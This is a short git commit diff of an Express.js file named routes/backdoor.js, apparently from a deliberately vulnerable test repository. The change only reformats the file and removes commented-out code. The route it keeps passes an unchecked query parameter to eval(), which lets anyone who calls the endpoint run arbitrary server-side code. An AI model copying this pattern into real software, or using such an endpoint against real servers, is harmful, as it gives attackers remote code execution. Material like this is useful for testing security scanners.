72b0b577dd4a04d0b688c9c19e35a794180f0c94
cicdomgeving <61230583+cicdomgeving@users.noreply.github.com>
2020-03-30 15:01:55 +0200

    Update backdoor.js

--- routes/backdoor.js
+++ routes/backdoor.js
@@ -1,14 +1,10 @@
 var express = require('express');
 var router = express.Router();
+
 /* GET for backdoor */
-
-
 router.get('/', function (req, res) {
     res.send('Hello ' + eval(req.query.q));
     console.log(req.query.q);
 });
-/*router.listen(8080, function () {
-    console.log('Example app listening on port 8080!');
-});*/
 
 module.exports = router;
